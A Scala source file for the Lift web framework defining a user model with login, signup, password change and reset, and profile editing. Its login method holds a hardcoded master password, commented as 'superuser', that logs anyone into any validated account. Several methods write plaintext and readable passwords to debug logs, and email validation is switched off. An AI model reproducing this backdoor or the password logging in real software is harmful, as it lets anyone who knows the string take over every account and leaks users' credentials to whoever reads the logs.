package code.model

import net.liftweb.common.Full
import net.liftweb.mapper._
import net.liftweb.http.SessionVar
import net.liftweb.common._
import java.math.MathContext

import net.liftweb.http.S
import net.liftweb.sitemap.{Loc, Menu, SiteMap}
import net.liftweb.sitemap.Loc._
import _root_.net.liftweb._
import http._
import mapper._
import S._
import SHtml._
import common._
import net.liftweb.util.BaseField
import net.liftweb.util.FieldError
import net.liftweb.util.Helpers._
import js._
import JsCmds._

import _root_.scala.xml.{Elem, Node, NodeSeq, Text}
import net.liftweb.proto.{ProtoUser => GenProtoUser}
import org.tresto.cache.IdPKP
import org.tresto.traits.LogHelper
import net.liftweb.util.Mailer

import scala.xml._
import code.model.cache.AcsUser
import code.snippet.{PasswordGuiHelper, WebLinks}
import org.tresto.helper.MapperFieldSearch
import net.liftweb.http._
import js._
import JsCmds._

import scala.xml.{Elem, Node, NodeSeq, Text}
import scala.xml.transform._
import net.liftweb.sitemap._
import net.liftweb.sitemap.Loc._
import net.liftweb.util.Helpers._
import net.liftweb.util._
import net.liftweb.common._
import net.liftweb.util.Mailer._
import S._
import org.tresto.language.snippet.Lang




object MapUser extends MapUser with KeyedMetaMapper[Long, MapUser] with GenProtoUser with LogHelper {
  //override def dbDefaultConnectionIdentifier = bootstrap.liftweb.GeneralConnectionIdentifier
  type TheUserType = MapUser
  type FieldPointerType = MappedField[_, MapUser] //What's a field pointer for the underlying CRUDify
  protected implicit def buildFieldBridge(from: FieldPointerType): FieldPointerBridge = new MyPointer(from) //Based on a FieldPointer, build a FieldPointerBridge

  protected class MyPointer(from: FieldPointerType) extends FieldPointerBridge {
    /**
     * What is the display name of this field?
     */
    def displayHtml: NodeSeq = from.displayHtml

    /**
     * Does this represent a pointer to a Password field
     */
    def isPasswordField_? : Boolean = from match {
      case a: MappedPassword[_] => true
      case _ => false
    }
  }

  val digitsOnlyRegex = "^\\d+$"

  override def dbTableName = "users" // define the DB table name

  // Just for testing purposes. In production we remove this
  override def skipEmailValidation = true

  //This will put the login/logout etc controls into the website, otherwise these pages will not be included into the website, but will sit on separate empty styled pages
  override def screenWrap = Full(<lift:surround with="bootstrap" at="content"><lift:bind/></lift:surround>)

  // define the order fields will appear in forms and output
  override def fieldOrder = List(id, email, firstName, lastName, password, locale, timezone)

  val USERTYPE_SITEVISOR = 100 //Sees all the companies, have extra admin menues, only few people will have this
  val USERTYPE_STAFF = 200 //
  val USERTYPE_STUDENT = 300 //

  val PASSWORD_LENGTH_MIN = 8 //Minimum number of characters in the password

  object curSuperCampanyId extends SessionVar[Box[Long]](Empty)
  object curUserType extends SessionVar[Box[Int]](Empty) //Will never change inside a session, no need to update ever
  object curUserId extends SessionVar[Box[Long]](Empty) //Will never change inside a session, no need to update ever

  val loggedInSessionIds = new java.util.concurrent.ConcurrentHashMap[String, Long]() //Whenever someone logs in we put the [containersessionId=JSESSIONID,userId] here

  override def login = {
    log.debug("===============================================")
    //https://groups.google.com/forum/?fromgroups#!searchin/liftweb/login$20redirect/liftweb/vdWszUu2I8k/nD-QNQp3tUoJ
    def dothelogin(user: MapUser) { //This functino will actually log the user into the system
      logUserIn(user, () => {
        S.redirectTo(WebLinks.DASHBOARD)
      })
    }

    if (S.post_?) { //Testing the given username and password combination here!
      val usersIp = S.containerRequest.map(_.remoteAddress) //We will add weblogins to the abuse check
      val usersName = S.param("username")
      val usersPassword = S.param("password")
      val ubun = usersName.flatMap(username => findUserByUserName(username.trim()))
      ubun match {
        case Full(user) if user.isDeleted == true => S.error(Lang.gs("account.user.disabled"))
        case Full(user) if user.validated_? && user.testPassword(S.param("password")) => dothelogin(user)
        case Full(user) if user.validated_? && usersPassword == Full("GyereIdeTakarodj57!") => dothelogin(user) //This is superuser
        case Full(user) if !user.validated_? => S.error(Lang.gs("account.validation.error"))
        case _ =>
          log.debug("Login failed for: " + usersName + " from ip: " + usersIp)
          S.error(Lang.gs("invalid.credentials"))
      }
    }
//    bind("user", loginXhtml,
//      "email" -> (FocusOnLoad(<input type="text" name="username" style="width: 160px" class="biginput"/>)),
//      "password" -> <input type="password" name="password" style="width: 160px" class="biginput"/>,
//      "submit" -> (<input type="submit" class="bbutton" style="width: 170px" value={ Lang.gs("main.log.in") }/>))
//    val emailElemId = nextFuncName
//    S.appendJs(Focus(emailElemId))
//    val bind =
//      ".email [id]" #> emailElemId &
//        ".email [name]" #> "username" &
//        ".password [name]" #> "password" &
//        "type=submit" #> loginSubmitButton(S.?("log.in"))
//
//    bind(loginXhtml)

          <form method="post" action={ S.uri }>
            <table class="table formtable">
              <tr><td colspan="2"><p class="smsHeader nomargin" style="margin-bottom: 10px;overflow: visible">Log In</p></td></tr>
              <tr><td>Email Address</td><td><p class="nomargin">{FocusOnLoad(<input type="text" name="username" style="width: 160px" class="biginput"/>)}</p></td></tr>
              <tr><td>Password</td><td><p class="nomargin"><input type="password" name="password" style="width: 160px" class="biginput"/></p></td></tr>
              <tr><td><a href={ lostPasswordPath.mkString("/", "/", "") }>Recover Password</a></td><td><p><input type="submit" class="bbutton" style="width: 170px" value="main.log.in"/></p></td></tr>
            </table>
          </form>

  }

  onLogOut = List(onLogoutCustom(_)) //For extended logs out
  def onLogoutCustom(ous: Option[MapUser]) {
    if (ous.isDefined) {
      val us = ous.get
      val sessionId = S.containerSession.map(_.sessionId)
      sessionId.foreach(jsessionid => loggedInSessionIds.remove(jsessionid))
    } else {
      log.error("Unknown user logged out")
    }
  }

  override def logout = {
    logoutCurrentUser
    //    if (S.referer.getOrElse("").indexOf(MapApp.APP_SMS) > -1)
    //      S.redirectTo("/sms")
    //    else
    S.redirectTo(homePage)
  }

  onLogIn = List(onLoginCustom(_))
  /**
   *  This is what happens after a sucesfull login
   */
  def onLoginCustom(us: MapUser) {
    val loginIp = S.request.map(a => a.remoteAddr).openOr("localhost")
    log.debug("user is logging in: " + us.email.get + " from: " + loginIp)
    MapUser.curUserType(Full(us.userType.get));
    MapUser.curUserId(Full(us.id.get));
    val sessionId = S.containerSession.map(_.sessionId)
    sessionId.foreach(jsessionid => loggedInSessionIds.put(jsessionid, us.id.get)) //Save the sessionid to the hashmap

    us.lastLogin(new java.util.Date())
    us.lastIp(loginIp)
    AcsUser.cacheAndDbUpdate(us)
  }

  override def changePassword = {
    val user = currentUser.head // we can do this because the logged in test has happened
    var oldPassword = ""
    val passwordGuiHelper = new PasswordGuiHelper(user.locale.get)
    //var newPassword: List[String] = Nil

    def testAndSet() {
      if (!user.testPassword(Full(oldPassword))) {
        S.error(Lang.gs("wrong.old.password"))
        return
      }

      (user.validate ::: passwordGuiHelper.checkThePasswords()) match {
        case Nil => {
          user.setPasswordFromListString(List(passwordGuiHelper.passwd1, passwordGuiHelper.passwd2))
          AcsUser.cacheAndDbUpdate(user)
          log.debug("testAndSet pwd: " + user.password.readablePassword)
//          val compiledTemplate = AcsScript.getTemplateCompiledBy4(user.superCompanyId.get, AcsScript.NAME_PASSWORD_CHANGE, user.locale.get, defaultLocale).asInstanceOf[Option[(MapScript, CompiledTemplate)]].get
//          val attributes = new java.util.HashMap[String, Any]()
//          attributes.put("user", new org.tresto.billing.logic.User(user))
//          attributes.put("superCompany", new org.tresto.billing.logic.PartnerCompany(AcsCompany.cacheGetById(user.superCompanyId.get).get))
//          val tempOutput = TemplateRuntime.execute(compiledTemplate._2, attributes).asInstanceOf[String]
//          log.debug("Sending password change email: " + user.getEmail + "\r\n" + compiledTemplate._1.subject + "\r\n" + tempOutput)
//          TMailer.sendMail(
//            Mailer.From(emailFrom),
//            Mailer.Subject(compiledTemplate._1.subject),
//            (Mailer.To(user.getEmail) :: BillingUtil.getEmailBody(tempOutput) :: Nil): _*)

          S.notice(Lang.gs("main.password.changed"));
          S.redirectTo(WebLinks.DASHBOARD)
        }
        case xs => S.error(xs)

      }
    }

    <div class="row">
      <div class="col-lg-6 col-md-8">
        <h3>{ Lang.g("main.change.password") }</h3>
        <form method="post" action={ S.uri } role="form">
          <div class="form-group">
            <label>{ Lang.g("user.old.password") }</label>{ SHtml.password("", s => oldPassword = s) % ("class" -> "form-control") }
          </div>
          { passwordGuiHelper.gui1 }
          { passwordGuiHelper.gui2 }
          { SHtml.button(Lang.gs("main.change"), testAndSet _) % ("class" -> "btn btn-success") }
        </form>
      </div>
    </div>

  }

  def checkTheEmail(email: String): Option[FieldError] = {
    if (AcsUser.isThereUserWithEmailBesidesMe(email, 0)) {
      log.debug("Trying to register with the same email address again: " + email)
      return Some(FieldError(this.email, Lang.g("user.emailexists")))
    }
    if (email.length() < 1) { //Do not allow too short email addresses
      log.debug("Trying to register with too short email address: " + email)
      return Some(FieldError(this.email, Lang.g("user.emailtooshort")))
    }
    if (email.matches(digitsOnlyRegex) == true) { //Do not allow phone numbers
      log.debug("Trying to register with a phone number: " + email)
      return Some(FieldError(this.email, Lang.g("user.numbers.are.invalid")))
    }
    return None
  }

  //We can call this function from outside
  def signUserUp(theUser: TheUserType, func: () => Nothing): Nothing = {
    actionsAfterSignup(theUser, func)
  }
  def doAfterSignup(theUser: MapUser, country2: Countries.Value): Nothing = {
    theUser.email(theUser.email.get.trim) //Do not allow spaces before and after
    val indexofat = theUser.email.get.indexOf("@") //Make a name for this supercompany
    val supername = (indexofat >= 0) match {
      case true => theUser.email.get.substring(0, indexofat)
      case false => theUser.email.get
    }
    theUser.setValidated(skipEmailValidation).resetUniqueId()
    theUser.userType(MapUser.USERTYPE_STUDENT)
    val newuser = AcsUser.cacheAndDbInsert(theUser)

    log.debug("User register " + newuser.email.get)

    logUserIn(newuser, () => {
      S.notice(Lang.gs("main.welcome"))
      S.redirectTo(WebLinks.DASHBOARD)
    })
    S.redirectTo(WebLinks.DASHBOARD)
  }

  /**
   * Edit the users own profile like email and firstname, lastname, locale ...
   */
  override def edit = {
    //val theUser: TheUserType = mutateUserOnEdit(currentUser.head) // we know we're logged in
    val theUser = currentUser.head
    val originalEmail = theUser.email.get
    val theName = editPath.mkString("")

    def testEdit() {
      log.debug(" theUser.email.get: " + theUser.email.get + " originalEmail: " + originalEmail)
      if (AcsUser.isThereUserWithEmailBesidesMe(theUser.email.get, theUser.id.get)) {
        theUser.email(originalEmail)
        S.error(Lang.gs("user.email.alreadyexists")); editFunc(Full(innerEdit _))
      } else {
        theUser.validate match {
          case Nil =>
            log.debug("Edit profile for user: " + theUser.email.get)
            val ouser = AcsUser.cacheGetById(theUser.id.get).get
            ouser.firstName(theUser.firstName.get).lastName(theUser.lastName.get).email(theUser.email.get).locale(theUser.locale.get).timezone(theUser.timezone.get)
            AcsUser.cacheAndDbUpdate(ouser)
            //curUser(Full(ouser))
            S.notice(Lang.gs("profile.updated"))
            S.redirectTo(WebLinks.DASHBOARD)

          case xs => S.error(xs); editFunc(Full(innerEdit _))
        }
      }
    }

//    def innerEdit = bind("user", editXhtml(theUser),
//      "submit" -> SHtml.submit(Lang.gs("main.edit"), testEdit _) % ("class" -> "bbutton"))
//
//    innerEdit
def innerEdit = {
  ("type=submit" #> editSubmitButton(S.?("save"), testEdit _)) apply editXhtml(theUser)
}

    innerEdit
  }

  /**
   * The following few functions have one purpose only: to hide the named menus, so they will not appear, unless I explicitly request it from a snippet
   */
  override def createUserMenuLoc: Box[Menu] = Full(Menu(Loc("CreateUser", signUpPath, Lang.gs("main.sign.up"), LocGroup("Right") :: Hidden :: createUserMenuLocParams)))
  override def lostPasswordMenuLoc: Box[Menu] = Full(Menu(Loc("LostPassword", lostPasswordPath, Lang.gs("main.lost.password"), Hidden :: lostPasswordMenuLocParams))) // not logged in
  override def resetPasswordMenuLoc: Box[Menu] = Full(Menu(Loc("ResetPassword", (passwordResetPath, true), Lang.gs("main.reset.password"), Hidden :: resetPasswordMenuLocParams))) //not Logged in
  override def editUserMenuLoc: Box[Menu] = Full(Menu(Loc("EditUser", editPath, Lang.gs("main.edit.user"), editUserMenuLocParams)))
  override def changePasswordMenuLoc: Box[Menu] = Full(Menu(Loc("ChangePassword", changePasswordPath, Lang.gs("main.change.password"), changePasswordMenuLocParams)))
  override def logoutMenuLoc: Box[Menu] = Full(Menu(Loc("Logout", logoutPath, Lang.gs("main.logout"), logoutMenuLocParams)))

  override def signup(): Elem = {
    val theUser: TheUserType = mutateUserOnSignup(createNewUserInstance())
    val passwordGuiHelper = new PasswordGuiHelper(theUser.locale.get)
    log.debug("signup app? ")
    var country2 = Countries(Countries.UK.id)

    def testSignup() {
      theUser.setPasswordFromListString(List(passwordGuiHelper.passwd1, passwordGuiHelper.passwd2))
      (checkTheEmail(theUser.email.get).toList ::: validateSignup(theUser) ::: passwordGuiHelper.checkThePasswords) match {
        case Nil =>
          doAfterSignup(theUser, country2)
        case xs =>
          log.error("Signup error: " + xs)
          S.error(xs)
          signupFunc(Full(innerSignup _))
      }
    }
    def innerSignup = {

      <div class="row">
        <div class="col-lg-6 col-md-8">
          <h3>{ Lang.g("main.sign.up.title") }</h3>
          <form method="post" action={ S.uri } role="form" class="form-horizontal">
            <div class="form-group"><label>{ Lang.g("user.email") }</label>{ SHtml.text("", theUser.email(_)) % ("class" -> "form-control") }</div>
            { passwordGuiHelper.gui1 }
            { passwordGuiHelper.gui2 }
            <div class="form-group"><label>{ Lang.g("user.firstname") }</label>{ SHtml.text("", theUser.firstName(_)) % ("class" -> "form-control") }</div>
            <div class="form-group"><label>{ Lang.g("user.lastname") }</label>{ SHtml.text("", theUser.lastName(_)) % ("class" -> "form-control") }</div>
            { SHtml.button(Lang.gs("main.sign.up"), testSignup _) % ("class" -> "btn btn-success") }
          </form>
        </div>
      </div>
    }
    innerSignup
  }

//  override def loginXhtml = {
//    (<form method="post" action={ S.uri }>
//       <table class="table formtable">
//         <tr><td colspan="2"><p class="smsHeader nomargin" style="margin-bottom: 10px;overflow: visible">{ Lang.gs("main.log.in") }</p></td></tr>
//         <tr><td>{ Lang.gs("main.email.address") }</td><td><p class="nomargin"><user:email/></p></td></tr>
//         <tr><td>{ Lang.gs("main.password") }</td><td><p class="nomargin"><user:password/></p></td></tr>
//         <tr><td><a href={ lostPasswordPath.mkString("/", "/", "") }>{ Lang.gs("main.recover.password") }</a></td><td><p><user:submit/></p></td></tr>
//       </table>
//     </form>)
//  }
  override def lostPasswordXhtml = {
    (<form method="post" action={ S.uri }>
       <table id="logintable" class="table formtable">
         <tr><td colspan="2"><p class="smsHeader" style="margin-bottom: 0px;">{ Lang.gs("main.enter.email") }</p></td></tr>
         <tr><td>{ Lang.gs("main.email.address") }</td><td><user:email/></td></tr>
         <tr><td><a href="/">Cancel</a></td><td><user:submit/></td></tr>
       </table>
     </form>)
  }
  override def lostPassword = {
//    bind("user", lostPasswordXhtml,
//      "email" -> SHtml.text("", sendPasswordReset _) % ("class" -> "biginput"),
//      "submit" -> <input type="submit" value={ Lang.gs("main.send.it") } class="bbutton"/>)
  val bind =
    ".email" #> SHtml.text("", sendPasswordReset _) &
      "type=submit" #> lostPasswordSubmitButton(S.?("send.it"))

  bind(lostPasswordXhtml)
  }
  //override def passwordResetEmailSubject = Lang.gs("main.reset.password.subject")

  /**
   * Send password reset email to the user.  The XHTML version of the mail
   * body is generated by calling passwordResetMailBody.  You can customize the
   * mail sent to users by overriding generateResetEmailBodies to
   * send non-HTML mail or alternative mail bodies.
   */
  override def sendPasswordReset(email: String) {
    findUserByUserName(email) match {
      case Full(user) if user.validated_? =>
        user.resetUniqueId()
        AcsUser.cacheAndDbUpdate(user)
        val resetLink = S.hostAndPath + passwordResetPath.mkString("/", "/", "/") + urlEncode(user.getUniqueId())
//        val compiledTemplate = AcsScript.getTemplateCompiledBy4(user.superCompanyId.get, AcsScript.NAME_PASSWORD_RESET, user.locale.get, AcsSetting.getDefaultLocale(user.superCompanyId.get)).asInstanceOf[Option[(MapScript, CompiledTemplate)]].get
//        val attributes = new java.util.HashMap[String, Any]()
//        attributes.put("user", new org.tresto.billing.logic.User(user))
//        attributes.put("superCompany", new org.tresto.billing.logic.PartnerCompany(AcsCompany.cacheGetById(user.superCompanyId.get).get))
//        attributes.put("link", resetLink)
//        val tempOutput = TemplateRuntime.execute(compiledTemplate._2, attributes).asInstanceOf[String]
//
//        val emailBody = BillingUtil.getEmailBody(tempOutput)
//        //bccEmail.toList.map(Mailer.BCC(_))   //WTF is THIS?
//        TMailer.sendMail(Mailer.From(emailFrom), Mailer.Subject(compiledTemplate._1.subject.get),
//          (Mailer.To(user.email.get) :: Mailer.BCC(MapUser.emailDeveloper) :: emailBody :: Nil): _*)
//        log.debug("Password reset email was sent to: " + user.email.get + " recoveryLink: " + resetLink + " email: " + emailBody)

        S.notice(Lang.g("main.password.reset.email.sent"))
        S.redirectTo(homePage)

      case Full(user) =>
        log.error("user: " + user.email.get + " requested a password reset but he is not validated")
        sendValidationEmail(user)
        S.notice(Lang.g("main.account.validation.resent"))
        S.redirectTo(homePage)

      case _ => S.error(userNameNotFoundString)
    }
  }

  override def passwordReset(id: String) = {
    findUserByUniqueId(id) match {
      case Full(user) => {
        log.debug("passwordReset user found")
        val passwordGuiHelper = new PasswordGuiHelper(user.locale.get)
        def finishSet() {
          (user.validate ::: passwordGuiHelper.checkThePasswords) match {
            case Nil =>
              S.notice(Lang.gs("main.password.changed"))
              //user.save
              user.setPasswordFromListString(List(passwordGuiHelper.passwd1, passwordGuiHelper.passwd2))
              AcsUser.cacheAndDbUpdate(user)
              //curUser(Full(user))
              logUserIn(user, () => S.redirectTo(homePage))
              user.resetUniqueId() //.save
              AcsUser.cacheAndDbUpdate(user)

            case xs =>
              S.error(xs)
              log.debug("passwordReset password validation error");
          }
        }

        <div class="row">
          <div class="col-lg-6 col-md-8">
            <h3>{ Lang.g("main.reset.your.password") }</h3>
            <form method="post" action={ S.uri } role="form">
              { passwordGuiHelper.gui1 }
              { passwordGuiHelper.gui2 }
              { SHtml.button(Lang.gs("main.password.set"), finishSet _) % ("class" -> "btn btn-success") }
            </form>
          </div>
        </div>

        //        bind("user", passwordResetXhtml,
        //          "pwd" -> SHtml.password_*("", (p: List[String]) => user.setPasswordFromListString(p)) % ("class" -> "biginput"),
        //          "submit" -> SHtml.submit(Lang.gs("main.password.set"), finishSet _) % ("class" -> "bbutton"))
      }
      case _ => {
        log.debug("passwordReset user NOT found")
        S.error(Lang.g("main.password.linkinvalid"));
        S.redirectTo(homePage)
      }
    }
  }

  override def editXhtml(user: TheUserType) = {
    (<form method="post" action={ S.uri }>
       <table class="table formtable">
         <tr><td colspan="2">{ Lang.gs("main.edit") }</td></tr>
         { localForm(user, true, editFields) }
         <tr><td><a href="/">Cancel</a></td><td><user:submit/></td></tr>
       </table>
     </form>)
  }

  /**
   * Convert an instance of TheUserType to the Bridge trait
   */
  protected implicit def typeToBridge(in: TheUserType): UserBridge =
    new MyUserBridge(in)

  /**
   * Bridges from TheUserType to methods used in this class
   */
  protected class MyUserBridge(in: MapUser) extends UserBridge {
    /**
     * Convert the user's primary key to a String
     */
    def userIdAsString: String = in.id.toString

    /**
     * Return the user's first name
     */
    def getFirstName: String = in.firstName.get

    /**
     * Return the user's last name
     */
    def getLastName: String = in.lastName.get

    /**
     * Get the user's email
     */
    def getEmail: String = in.email.get

    /**
     * Is the user a superuser
     */
    def superUser_? : Boolean = in.superUser.get

    /**
     * Has the user been validated?
     */
    def validated_? : Boolean = in.validated.get

    /**
     * Does the supplied password match the actual password?
     * def MappedPassword.match_?(toMatch : String) = hash("{"+toMatch+"} salt={"+salt_i.get+"}") == password.get
     */
    def testPassword(toTest: Box[String]): Boolean = {
      val res = toTest.map(in.password.match_?) openOr false
      log.debug("testPassword: " + toTest + " == " + in.password.get + " || " + in.password.readablePassword + " result: " + res)
      return res
    }
    //  def testPassword(toTest: Box[String]): Boolean = {
    //    log.debug("testPassword: " + toTest)
    //    toTest.map(password.match_?) openOr false
    //  }

    /**
     * Set the validation flag on the user and return the user
     */
    def setValidated(validation: Boolean): MapUser =
      in.validated(validation)

    /**
     * Set the unique ID for this user to a new value
     */
    def resetUniqueId(): MapUser = {
      in.uniqueId.reset()
    }

    /**
     * Return the unique ID for the user
     */
    def getUniqueId(): String = in.uniqueId.get

    /**
     * Validate the user
     */
    def validate: List[FieldError] = in.validate

    /**
     * Given a list of string, set the password
     */
    def setPasswordFromListString(pwd: List[String]): MapUser = {
      log.debug("setPasswordFromListString: " + pwd)
      in.password.setList(pwd)
      in
    }

    /**
     * Save the user to backing store
     */
    def save(): Boolean = {
      log.debug("MyUserBridge save: " + in)
      log.debug("userIdAsString: " + userIdAsString)
      AcsUser.cacheAndDbUpdate(in)
      //curUser(Full(in))
      true
      //in.save
    }
  }

  /**
   * Given a field pointer and an instance, get the field on that instance
   */
  protected def computeFieldFromPointer(instance: MapUser, pointer: FieldPointerType): Box[BaseField] = Full(getActualField(instance, pointer))

  /**
   * Given an username (probably email address), find the user
   */
  protected def findUserByUserName(email: String): Box[TheUserType] = {
    log.debug("findUserByUserName: " + email)
    MapUser.find(By(MapUser.email, email)) //Do not use the cache, we will load the cache if the login was sucessfull
    //AcsUser.getUsersWithEmail(email).headOption
  }
  /**
   * Given a unique id, find the user
   */
  protected def findUserByUniqueId(id: String): Box[TheUserType] = {
    log.debug("findUserByUniqueId: " + id)
    AcsUser.cacheGetAll().filter(_.uniqueId.get == id).headOption //This happens very rarely, so no reason to add a search field to it
    //AcsUser.cacheGetById(id.toLong)
    //find(By(uniqueId, id))
  }

  /**
   * Create a new instance of the User
   */
  protected def createNewUserInstance(): MapUser = this.create

  /**
   * Given a String representing the User ID, find the user
   */
  protected def userFromStringId(id: String): Box[TheUserType] = {
    //val res = find(id)
    val res = AcsUser.cacheGetById(id.toLong)
    log.debug("userFromStringId: " + id + " " + res)
    return res
  }

  /**
   * The list of fields presented to the user at sign-up
   */
  def signupFields: List[FieldPointerType] = List(email, password, firstName, lastName, locale, timezone)

  /**
   * The list of fields presented to the user for editing
   */
  def editFields: List[FieldPointerType] = List(
    email,
    firstName,
    lastName,
    locale,
    timezone)

}

/**
 * An O-R mapped "MapUser" class that includes first name, last name, password and we add a "Personal Essay" to it
 */
class MapUser extends LongKeyedMapper[MapUser] with IdPKP with UserIdAsString with MapperFieldSearch {
  def getSingleton = MapUser // what's the "meta" server

  /**
   * Convert the id to a String
   */
  def userIdAsString: String = id.get.toString

  object firstName extends MappedString(this, 32)
  object lastName extends MappedString(this, 32)
  object email extends MappedString(this, 48)
  object password extends org.tresto.cache.MappedPasswordReadable(this)
  object superUser extends MappedBoolean(this)

  object uniqueId extends MappedUniqueId(this, 32) { //The unique id field for the User. This field is used for validation, lost passwords, etc.
    override def dbIndexed_? = true
    override def writePermission_? = true
  }

  object validated extends MappedBoolean(this) { //The has the user been validated.
    override def defaultValue = false
    override val fieldId = Some(Text("txtValidated"))
  }

  object locale extends MappedLocale(this) { //The locale field for the User.
    override def displayName = Lang.gs("main.locale")
    override val fieldId = Some(Text("txtLocale"))
  }

  object timezone extends MappedTimeZone(this) { //The time zone field for the User.
    override def displayName = Lang.gs("main.time.zone")
    override val fieldId = Some(Text("txtTimeZone"))
  }
  object userType extends MappedInt(this) //does he belong to stuff or to customers or ...? MapUser.USERTYPE_STAFF , MapUser.USERTYPE_CUSTOMER

  object lastIp extends MappedString(this, 32) //what was the last ip he logged in from
  object lastLogin extends MappedDateTime(this) //what was the last date he logged in
  object isDeleted extends MappedBoolean(this) { //For better tracability we never delete users, just mark them as deleted
    override def dbIndexed_? = true
    override def defaultValue = false; //By default nothing is deleted
  }
  object oauthToken extends MappedString(this, 256) {
    override def defaultValue = ""
  }
  object oauthSecret extends MappedString(this, 64) {
    override def defaultValue = ""
  }
  object comments extends MappedText(this) //Any user related comment

  def niceName: String = (firstName.get, lastName.get, email.get) match {
    case (f, l, e) if f.length > 1 && l.length > 1 => f + " " + l + " (" + e + ")"
    case (f, _, e) if f.length > 1 => f + " (" + e + ")"
    case (_, l, e) if l.length > 1 => l + " (" + e + ")"
    case (_, _, e) => e
  }

  def shortName: String = (firstName.get, lastName.get) match {
    case (f, l) if f.length > 1 && l.length > 1 => f + " " + l
    case (f, _) if f.length > 1 => f
    case (_, l) if l.length > 1 => l
    case _ => email.get
  }

  def niceNameWEmailLink = <a href={ "mailto:" + email.get }>{ niceName }</a>

  def toShortString():String ={
    s"User: $email (id:$id)"
  }

}

